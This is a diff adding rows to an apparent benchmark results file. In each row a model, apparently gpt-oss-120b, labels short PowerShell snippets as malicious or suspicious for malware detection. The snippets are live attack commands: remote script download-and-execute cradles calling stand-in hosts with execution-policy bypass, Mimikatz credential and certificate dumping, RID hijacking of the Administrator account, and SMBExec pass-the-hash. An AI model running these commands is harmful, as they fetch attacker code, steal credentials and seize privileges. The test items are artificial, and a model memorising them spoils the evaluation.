+      ""code"": ""Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable"",
+      ""code_explain"": ""Calls a non‑standard PowerShell function that likely manipulates the Security Account Manager (SAM) or token privileges to replace the current security context with that of the target RID (500 = built‑in Administrator). Supplying a clear‑text password and the `-Enable` switch indicates an attempt to gain elevated rights, which is characteristic of RID hijacking attacks."",
+      ""tag"": ""PRIVILEGE_ESCALATION""
+    }
+  ],
+  ""explain"": ""The presence of a custom `Invoke-RIDHijacking` command that directly targets the Administrator RID and supplies a password demonstrates an intent to elevate privileges and impersonate a high‑privilege account, which is malicious behavior."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""PRIVILEGE_ESCALATION""
+}",,,"# Natural language intent:
+# Perform RID Hijacking to impersonate the specified user (David) with the specified RID, password, and enable the impersonation.
+
+Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable
+",1568
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0316,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote script via Invoke-Expression, bypasses execution policy. Identify evidence: the command line with -ExecutionPolicy Bypass, Invoke-Expression, WebClient DownloadString. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, DEFENSE_EVASION, OBFUSCATION maybe not. Provide explanation. is_malicious: Malicious. Tag: DOWNLOADER or EXECUTION? Choose ""DOWNLOADER"". Provide evidence array with each segment.
+
+We need to include required fields: summary, is_malicious, explain. evidence optional but include.
+
+Structure: properties: summary string, evidence array of objects with code, code_explain, tag. explain string, is_malicious enum, tag string (general category). Provide no additionalProperties.
+
+Let's craft.
+
+","{
+  ""summary"": ""The command bypasses PowerShell's execution policy, downloads a script from a remote URL, and executes it with Invoke-Expression."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')\"""",
+      ""code_explain"": ""The `-ExecutionPolicy Bypass` flag disables PowerShell's execution restrictions, allowing unsigned or malicious code to run. `New-Object System.Net.WebClient).DownloadString(...)` fetches a script from an external HTTP server, which is a classic downloader pattern. The downloaded string is then passed to `Invoke-Expression`, which interprets and runs the content as PowerShell code, providing remote code execution."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')"",
+      ""code_explain"": ""`Invoke-Expression` executes arbitrary PowerShell code contained in a string, effectively allowing the attacker to run any payload retrieved from the remote server. This is a direct remote command execution technique."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""-ExecutionPolicy Bypass"",
+      ""code_explain"": ""Bypassing the execution policy is a defense‑evasion technique that prevents PowerShell from blocking the execution of scripts that are not signed or are otherwise restricted."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The script combines execution‑policy bypass, a network downloader, and `Invoke-Expression` to fetch and run arbitrary code from an external server, which is a well‑known malicious behavior pattern."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Download and execute a PowerShell script from a specified URL using Invoke-Expression with bypassed execution policy.
+
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""
+",1677
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0318,Malicious,"We need to analyze the provided PowerShell content. It's a simple command: Set-PSReadLineOption -AddToHistoryHandler { return $false }
+
+We need to produce JSON with required fields: summary, evidence (array), explain, is_malicious, tag (optional? required? The schema says tag is optional? It is defined but not required. We can include if malicious.)
+
+We need to evaluate if malicious. This command disables adding commands to history. That's a defense evasion technique, but not necessarily malicious. It could be used by an attacker to hide their commands. However alone it's benign; could be used for privacy. No remote execution, no download, no credential access. It's a configuration change. Could be considered ""DEFENSE_EVASION"" if used maliciously, but the script alone is not malicious. According to guidelines, if script exhibits at least one malicious indicator, classify as Malicious or Likely. This is a potential defense evasion, but it's a single config change. I'd classify as Likely (suspicious) because disabling history can be used by attackers, but not definitively malicious. However the instruction says ""if the script exhibits at least one malicious or offensive PowerShell indicator listed above or other suspicious indicators, classify it as Malicious or Likely."" This is a suspicious indicator: defense evasion. So Likely.
+
+Provide evidence: code segment and explanation, tag: DEFENSE_EVASION.
+
+Provide summary: disables command history.
+
+Explain: The script modifies PSReadLine to prevent commands from being recorded, which can be used to hide activity.
+
+Tag: DEFENSE_EVASION.
+
+is_malicious: Likely.
+
+Now produce JSON.","{
+  ""summary"": ""The script configures PSReadLine to stop recording entered commands in the PowerShell history."",
+  ""evidence"": [
+    {
+      ""code"": ""Set-PSReadLineOption -AddToHistoryHandler { return $false }"",
+      ""code_explain"": ""Uses Set-PSReadLineOption with the -AddToHistoryHandler parameter to supply a script block that always returns $false. This overrides the default handler that adds each command to the session history, effectively preventing any command from being logged. Suppressing command history is a known defense‑evasion technique that attackers use to hide their activity."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""While the command itself is a legitimate PowerShell configuration option, disabling command history is commonly employed by malicious actors to evade detection. The presence of this behavior without any benign context makes the script suspicious, but it does not on its own perform malicious actions such as downloading payloads or escalating privileges."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""DEFENSE_EVASION""
+}",,,"# Natural language intent:
+# Set PowerShell ReadLine options to disable adding commands to the history.
+
+Set-PSReadLineOption -AddToHistoryHandler { return $false }
+",1630
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0319,Malicious,"We need to produce JSON per schema. Summarize, evidence array with code, explanation, tag. Determine malicious. The script clearly downloads and executes from malicious site, uses bypass, hidden window. So malicious. Tags: DOWNLOADER, EXECUTION, DEFENSE_EVASION, OBFUSCATION maybe not obfuscation but bypass. Provide evidence: the whole command. Also the use of -Exec Bypass, -NoP, -NonI, -W Hidden. Provide explanation. Tag could be ""DOWNLOADER"" or ""EXECUTION"". Choose primary tag maybe ""DOWNLOADER"". Provide is_malicious ""Malicious"". Also overall tag maybe ""DOWNLOADER"". Provide summary. Provide explain. Ensure JSON matches schema: properties summary, evidence (array of objects), explain, is_malicious, tag (optional? required? Not required per schema but we can include). Must include required fields: summary, is_malicious, explain. Provide evidence array possibly multiple items. Provide code strings exactly as in content. Provide code_explain. Provide tag per evidence. Provide overall tag. Let's craft.
+
+","{
+  ""summary"": ""The command runs PowerShell with execution policy bypass, hidden window, and downloads a script from http://malicious-site.com to execute it immediately."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com')\"""",
+      ""code_explain"": ""The command launches PowerShell with -NoP (NoProfile), -NonI (NonInteractive), -W Hidden (hidden window) and -Exec Bypass to circumvent the system's execution policy. It then uses Invoke-Expression on the result of (New-Object Net.WebClient).DownloadString(...), which fetches a script from a remote URL and executes it in memory. This pattern is a classic downloader/execution technique used by malware."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""-Exec Bypass"",
+      ""code_explain"": ""Specifies the ExecutionPolicy bypass flag, allowing the script to run even if the system policy would block it. This is a common defense‑evasion tactic."",
+      ""tag"": ""DEFENSE_EVASION""
+    },
+    {
+      ""code"": ""-W Hidden"",
+      ""code_explain"": ""Runs the PowerShell process with a hidden window, preventing the user from seeing the activity. This is another defense‑evasion / stealth technique."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The script explicitly downloads and executes code from an external, untrusted URL while bypassing execution policy and hiding its window, which are hallmark behaviors of malicious downloader payloads."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Execute a hidden PowerShell command with bypassed execution policy to download and execute a script from a specified malicious site.
+
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com')""
+",1704
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0332,Malicious,"We need to produce JSON per schema. Summarize: script uses Invoke-Command to remote execute a script block that downloads and executes a script from malicious URL. Identify evidence: Invoke-Command remote execution, IEX with DownloadString, Net.WebClient, remote URL. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, DEFENSE_EVASION maybe. Provide explanation. Determine is_malicious: Malicious. Tag: likely ""REMOTE_COMMAND_EXECUTION"" or ""DOWNLOADER"". Provide evidence array with each segment.
+
+We need to follow schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Required: summary, is_malicious, explain. Provide those.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script remotely executes a PowerShell command on a target system that downloads and runs a script from an external URL."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Command -ComputerName <target_system> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1') }"",
+      ""code_explain"": ""Uses **Invoke-Command** to run code on a remote host (REMOTE_COMMAND_EXECUTION). The script block contains an **IEX (Invoke‑Expression)** of a string fetched via **Net.WebClient.DownloadString**, which retrieves a PowerShell script from an external URL and immediately executes it (DOWNLOADER + EXECUTION). This pattern is a classic attacker technique for delivering payloads to compromised machines."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1')"",
+      ""code_explain"": ""Creates a **Net.WebClient** object to download raw PowerShell code from the internet and pipes it to **IEX**, which evaluates the downloaded string as PowerShell code. This bypasses file‑write detection and enables on‑the‑fly execution of malicious payloads (DOWNLOADER, EXECUTION, DEFENSE_EVASION)."",
+      ""tag"": ""DOWNLOADER""
+    }
+  ],
+  ""explain"": ""The script performs remote command execution and directly downloads and runs code from an untrusted external URL, a well‑known malicious behavior used for initial compromise and payload delivery. No legitimate defensive or administrative purpose is evident."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Invoke a potentially malicious script block on a target system.
+
+Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1')}
+",1600
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0338,Malicious,"We need to produce JSON per schema. The content is a command line: powershell.exe -Command ""Invoke-Mimikatz -DumpCreds"". This is clearly malicious: invoking Mimikatz to dump credentials. So summary: script attempts to run Mimikatz to dump credentials. Evidence: the command line includes Invoke-Mimikatz -DumpCreds. Tag: CREDENTIAL_ACCESS, maybe also EXECUTION. Classification: Malicious. Tag field: maybe ""CREDENTIAL_ACCESS"". Provide evidence array with code and explanation.
+
+We need to follow schema: properties: summary (string), evidence (array of objects with code, code_explain, tag). explain (string). is_malicious (enum). tag (string) general category.
+
+We must include required fields: summary, is_malicious, explain. evidence optional but we include.
+
+Let's craft.
+
+","{
+  ""summary"": ""The command launches PowerShell to execute the Invoke‑Mimikatz function with the -DumpCreds switch, which extracts plaintext credentials from memory."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -Command \""Invoke-Mimikatz -DumpCreds\"""",
+      ""code_explain"": ""The command directly calls the Invoke‑Mimikatz module, a known PowerShell wrapper for the Mimikatz tool. The -DumpCreds argument instructs Mimikatz to read LSASS memory and output credential material (password hashes, clear‑text passwords, Kerberos tickets). This is a classic credential‑dumping technique used by attackers to harvest privileged credentials."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The script explicitly invokes a credential‑dumping tool (Mimikatz) via PowerShell, which is a well‑known malicious activity for stealing Windows credentials. No defensive or benign context is present, making the behavior clearly offensive."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Invoke Mimikatz to dump credentials using PowerShell.
+
+powershell.exe -Command ""Invoke-Mimikatz -DumpCreds""
+",1457
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0333,Malicious,"We need to produce JSON per schema. Summarize: script invokes remote command execution to download and execute script from remote server. Identify evidence: Invoke-Command remote execution, IEX with DownloadString, use of Net.WebClient, remote URL. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, OBFUSCATION maybe not. Provide explanation. Determine is_malicious: Malicious. Tag: REMOTE_COMMAND_EXECUTION or DOWNLOADER. Provide evidence array.
+
+Make sure required fields: summary, is_malicious, explain. evidence optional but include.
+
+Return JSON.","{
+  ""summary"": ""The script uses Invoke-Command to run a remote PowerShell block that downloads and executes a script from an external server."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Command -ComputerName $target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1') }"",
+      ""code_explain"": ""Invoke-Command executes PowerShell code on a remote computer ($target). Inside the ScriptBlock, IEX (Invoke‑Expression) runs whatever text is returned by (New-Object Net.WebClient).DownloadString(...), which fetches a PowerShell script from an external URL and immediately executes it. This combines remote command execution, a downloader, and dynamic code execution, all classic attacker techniques."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""(New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')"",
+      ""code_explain"": ""Creates a .NET WebClient object and retrieves the raw contents of a remote file over HTTP. Using an unencrypted HTTP URL makes the payload easy to tamper with and indicates a malicious downloader."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""IEX (...)"",
+      ""code_explain"": ""Invoke‑Expression evaluates the downloaded string as PowerShell code, allowing the attacker to run arbitrary commands without writing them to disk, a common defense‑evasion technique."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script performs remote command execution, downloads a script from an untrusted external server, and executes it in memory, which are definitive indicators of malicious behavior."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Invoke a potentially malicious script block on a specified target.
+
+Invoke-Command -ComputerName $target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')}
+",1584
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0341,Malicious,"We need to produce JSON with required fields: summary, is_malicious, explain, optionally evidence, tag. The script is just ""Invoke-Expression ${file_in}"". That's a single line that executes whatever is in variable file_in. This is potentially malicious because it allows arbitrary code execution, but without context it's ambiguous. It's a typical technique used by attackers to execute downloaded payloads. It's suspicious: remote code execution, execution, possibly obfuscation if variable is set elsewhere. But we have no evidence of where file_in comes from. So classification likely ""Likely"" or ""Notreally""? According to guidelines, if script exhibits at least one malicious indicator, classify as Malicious or Likely. Here we have execution of arbitrary content via Invoke-Expression, which is a known technique for code execution. That's suspicious. I'd classify as Likely (suspicious but not enough context). Provide evidence: the line itself. Tag: EXECUTION or OBFUSCATION? Probably EXECUTION. Provide explanation. Also maybe mention that using Invoke-Expression on variable is a known technique for code execution and can be used for malicious payloads. Provide summary: script executes code from a file path stored in variable. Provide is_malicious: Likely. Provide explain: because it runs arbitrary code without validation. Provide tag: EXECUTION. Provide evidence array with one object.","{
+  ""summary"": ""The script uses Invoke-Expression to execute the contents of a file referenced by the variable ${file_in}."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Expression ${file_in}"",
+      ""code_explain"": ""Invoke-Expression evaluates a string as PowerShell code. Passing an uncontrolled variable (e.g., a path to a file) allows arbitrary PowerShell commands to be run, a common technique for executing downloaded or staged payloads. The lack of validation or sandboxing makes this behavior suspicious."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""Running arbitrary code via Invoke-Expression is a known technique for malicious execution and privilege escalation. Because the source of ${file_in} is not shown, the script could be used to run any attacker‑controlled payload, making it suspicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Invoke expression to execute code from a specified file.
+
+Invoke-Expression ${file_in}
+",1519
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0351,Malicious,"We need to produce JSON per schema. Analyze script.
+
+Script:
+
+$code=@""Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds' ""@; Invoke-Command -ScriptBlock $code
+
+Interpretation: $code variable assigned a here-string containing ""Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds' "". Then Invoke-Command -ScriptBlock $code.
+
+Issues: Using Invoke-Expression to run Mimikatz, which dumps credentials. That's credential access. Also using Invoke-Command with scriptblock from variable (potential remote execution). It's malicious.
+
+Evidence: code assignment, use of Invoke-Expression, Invoke-Mimikatz -DumpCreds, Invoke-Command -ScriptBlock.
+
+Tags: CREDENTIAL_ACCESS, EXECUTION, possibly DEFENSE_EVASION (using scriptblock). Also OBFUSCATION? Not heavily obfuscated.
+
+Provide summary: script runs Mimikatz to dump credentials.
+
+Explain: malicious.
+
+Return JSON with fields: summary, evidence array, explain, is_malicious, tag (maybe ""CREDENTIAL_ACCESS"").
+
+Need to include evidence items with code, code_explain, tag.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script builds a script block that runs Invoke‑Mimikatz to dump credentials and then executes it with Invoke‑Command."",
+  ""evidence"": [
+    {
+      ""code"": ""$code=@\""Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds' \""@;"",
+      ""code_explain"": ""Assigns a string that contains an Invoke‑Expression call to run the Mimikatz module with the –DumpCreds switch, which extracts plaintext credentials from memory. The use of Invoke‑Expression to launch a credential‑dumping tool is a classic credential‑access technique."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    },
+    {
+      ""code"": ""Invoke-Command -ScriptBlock $code"",
+      ""code_explain"": ""Executes the previously built string as a script block. Running arbitrary code via a dynamically created script block is a common execution and defense‑evasion pattern, allowing the attacker to run malicious commands without them appearing directly in the script."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script explicitly attempts to run Mimikatz to dump credentials, which is a well‑known malicious activity. The dynamic construction and execution of the command further indicate offensive intent."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Create a code snippet and invoke it as a script block.
+
+$code=@""Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds' ""@; Invoke-Command -ScriptBlock $code
+",1587
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0342,Malicious,"We need to analyze the provided PowerShell content: ""Invoke-RIDHijacking -UseHost -RID 500"". This is a command invoking a function/module named Invoke-RIDHijacking with parameters -UseHost -RID 500. We need to assess maliciousness. RID Hijacking is a known technique to hijack a token by manipulating the Relative Identifier (RID) of a user account, often for privilege escalation. The command suggests using host process and targeting RID 500 (which is the built-in Administrator account). This is definitely suspicious, likely malicious (privilege escalation). Provide summary, evidence, explanation, classification.
+
+We need to output JSON with required fields: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Tag could be ""PRIVILEGE_ESCALATION"". Also maybe ""DEFENSE_EVASION"". Provide evidence: the command line itself.
+
+We need to include code segment exactly: ""Invoke-RIDHijacking -UseHost -RID 500"". Explanation: uses RID hijacking to elevate privileges by impersonating built-in Administrator. Tag: PRIVILEGE_ESCALATION.
+
+Also maybe ""EXECUTION"" but main is privilege escalation.
+
+Now produce JSON.","{
+  ""summary"": ""The script invokes a RID hijacking routine targeting the built‑in Administrator RID (500) with the –UseHost flag, a known privilege‑escalation technique."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-RIDHijacking -UseHost -RID 500"",
+      ""code_explain"": ""Calls a custom or imported function/module named Invoke‑RIDHijacking. The –RID 500 argument targets the well‑known Administrator account (RID 500). The –UseHost switch typically forces the hijack to run inside the host process, allowing the attacker to obtain a high‑privilege token. This pattern matches the RID hijacking technique used for privilege escalation on Windows systems."",
+      ""tag"": ""PRIVILEGE_ESCALATION""
+    }
+  ],
+  ""explain"": ""The command directly attempts to hijack the security token of the built‑in Administrator account, a classic offensive behavior for gaining elevated rights. No benign context is provided, and the technique is widely documented as malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""PRIVILEGE_ESCALATION""
+}",,,"# Natural language intent:
+# Invoke RID Hijacking with specified options.
+
+Invoke-RIDHijacking -UseHost -RID 500
+",1543
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0352,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote script via Invoke-Expression, bypasses execution policy. Identify evidence: -ep bypass (DEFENSE_EVASION), New-Object Net.WebClient .DownloadString (DOWNLOADER), Invoke-Expression (EXECUTION), remote URL (IOCs). Tag overall maybe ""DOWNLOADER"" or ""EXECUTION"". Classification: Malicious.
+
+Provide evidence array with code segments and explanations and tags.
+
+Also include iocs? Not required in schema, but we can embed in evidence.
+
+Return fields: summary, evidence, explain, is_malicious, tag (general category). Tag maybe ""DOWNLOADER"" or ""EXECUTION"". Choose ""DOWNLOADER"". Ensure required fields present.
+
+Let's craft JSON.","{
+  ""summary"": ""The command bypasses PowerShell's execution policy, downloads a script from a remote HTTP server, and executes it in memory."",
+  ""evidence"": [
+    {
+      ""code"": ""-ep bypass"",
+      ""code_explain"": ""Uses the -ExecutionPolicy Bypass flag to override the system's PowerShell execution policy, a common defense‑evasion technique that allows malicious code to run even on locked‑down hosts."",
+      ""tag"": ""DEFENSE_EVASION""
+    },
+    {
+      ""code"": ""(New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script')"",
+      ""code_explain"": ""Creates a .NET WebClient object and calls DownloadString to retrieve a script from an external HTTP URL. This is a classic downloader behavior that fetches malicious payloads from the Internet."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""Invoke-Expression ..."",
+      ""code_explain"": ""Passes the downloaded script text to Invoke-Expression, which parses and runs the code in the current session. This enables execution of arbitrary remote code without writing it to disk, a typical technique for file‑less attacks."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The command combines execution‑policy bypass, remote script download, and in‑memory execution, all of which are strong indicators of malicious activity. No legitimate purpose can be inferred from these actions alone."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Download and execute a malicious script from a specified website with bypass execution policy.
+
+powershell.exe -ep bypass -c ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script')""
+",1563
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0356,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote PowerShell script from dangerous domain. Identify evidence: the Invoke-Expression with IEX and DownloadString. Tags: DOWNLOADER, EXECUTION, REMOTE_COMMAND_EXECUTION, OBFUSCATION maybe not. Provide explanation. is_malicious: Malicious. Tag: DOWNLOADER or EXECUTION. Provide evidence array.
+
+Make sure required fields: summary, is_malicious, explain. evidence optional but include.
+
+Return JSON.","{
+  ""summary"": ""The script downloads a PowerShell script from http://dangerousdomain.com/KernDLL.ps1 and executes it in memory."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString(\""http://dangerousdomain.com/KernDLL.ps1\"")'"",
+      ""code_explain"": ""Uses `Invoke-Expression` (alias IEX) to execute code that is fetched at runtime via `New-Object Net.WebClient).DownloadString(...)`. This pattern is a classic downloader/back‑door technique: it retrieves arbitrary PowerShell code from a remote server and runs it without writing to disk, enabling remote command execution and evading static detection."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""IEX (New-Object Net.WebClient).DownloadString(\""http://dangerousdomain.com/KernDLL.ps1\"")"",
+      ""code_explain"": ""The `IEX` (Invoke‑Expression) cmdlet evaluates the downloaded string as PowerShell code, providing immediate execution. Combined with `DownloadString`, it creates a remote code execution vector."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    }
+  ],
+  ""explain"": ""The script directly fetches and runs code from an external, untrusted domain using `Invoke-Expression`, a well‑known technique for delivering malicious payloads. This behavior constitutes remote code execution and downloader functionality, which are strong indicators of malicious intent."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Invoke Expression to download and execute a script from a dangerous domain.
+
+Invoke-Expression -Command 'IEX (New-Object Net.WebClient).DownloadString(""http://dangerousdomain.com/KernDLL.ps1"")'
+",1510
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0371,Malicious,"We need to produce JSON per schema. The script is just a single line: Invoke-Mimikatz -DumpCerts. This is a PowerShell command invoking a function/module that runs Mimikatz to dump certificates. That's credential access, definitely malicious. Provide summary, evidence, explain, classification Malicious, tag CREDENTIAL_ACCESS (or maybe ""CREDENTIAL_ACCESS"" or ""DISCOVERY""? Dumping certs is credential access). Provide evidence: code line, explanation, tag.
+
+Return JSON with required fields: summary, is_malicious, explain, evidence array, optional tag field (general category). Also include tag field at root: maybe ""CREDENTIAL_ACCESS"". Provide evidence items with code, code_explain, tag.
+
+Let's craft.","{
+  ""summary"": ""The script calls the Invoke‑Mimikatz function with the –DumpCerts switch to extract certificate material from the system."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Mimikatz -DumpCerts"",
+      ""code_explain"": ""Invoke‑Mimikatz is a PowerShell wrapper for the native Mimikatz tool. The –DumpCerts option directs Mimikatz to read private keys and certificates from the Windows certificate store, which is a classic credential‑access technique used by attackers to harvest authentication material."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The command explicitly invokes a known post‑exploitation tool (Mimikatz) to dump certificates, which is a direct credential‑access operation and is considered malicious behavior."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Invoke Mimikatz to dump certificates.
+
+Invoke-Mimikatz -DumpCerts
+",1380
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0366,Malicious,"We need to analyze the provided PowerShell content. It's a command: Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'command or launcher to execute' -verbose
+
+We need to produce JSON with summary, evidence array, explain, is_malicious, tag.
+
+We need to identify suspicious indicators: remote command execution, credential access (hash), lateral movement, etc.
+
+The script uses Invoke-SMBExec, which is a known tool for SMB remote execution (like Impacket's smbexec). It passes NTLM hash, domain, username, target IP, command. This is clearly malicious/lateral movement.
+
+Thus classification: Malicious.
+
+Provide evidence: code segment: the whole command. Tag: REMOTE_COMMAND_EXECUTION, CREDENTIAL_ACCESS, LATERAL_MOVEMENT.
+
+Explain: uses credential hash to authenticate to remote SMB, runs arbitrary command.
+
+Provide summary: script attempts to execute arbitrary command on remote host via SMB using supplied credentials.
+
+Tag field: maybe ""LATERAL_MOVEMENT"" or ""REMOTE_COMMAND_EXECUTION"". Choose general category: ""LATERAL_MOVEMENT"".
+
+Now produce JSON per schema. evidence items need code, code_explain, tag.
+
+We can include multiple evidence items: one for credential hash (CREDENTIAL_ACCESS), one for remote execution (REMOTE_COMMAND_EXECUTION), one for lateral movement (LATERAL_MOVEMENT). Provide each.
+
+Now produce final answer.","{
+  ""summary"": ""The command uses Invoke‑SMBExec to authenticate to a remote host with a clear‑text NTLM hash and execute an arbitrary command over SMB."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'command or launcher to execute' -verbose"",
+      ""code_explain"": ""Invoke‑SMBExec is a PowerShell implementation of the SMBExec technique (similar to Impacket's smbexec). It authenticates to the target machine using the supplied domain, username, and NTLM hash, then creates a service or scheduled task to run the supplied command. Supplying a raw NTLM hash is a direct credential‑theft indicator and enables pass‑the‑hash attacks."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    },
+    {
+      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 ... -Command 'command or launcher to execute'"",
+      ""code_explain"": ""The -Command parameter contains an arbitrary command string that will be executed on the remote system. This is classic remote command execution, allowing the attacker to run any payload on the target."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""Invoke-SMBExec -Target 192.168.100.20 ..."",
+      ""code_explain"": ""Running a command on a remote host using SMB credentials constitutes lateral movement within a network, enabling the attacker to propagate from one compromised host to another."",
+      ""tag"": ""LATERAL_MOVEMENT""
+    }
+  ],
+  ""explain"": ""The script performs pass‑the‑hash authentication and executes an arbitrary command on a remote machine via SMB, which are hallmark techniques for lateral movement and remote code execution. These behaviors are inherently malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""LATERAL_MOVEMENT""
+}",,,"# Natural language intent:
+# Invoke SMBExec to run a command on a remote system with specified options.
+
+Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'command or launcher to execute' -verbose
+",1845
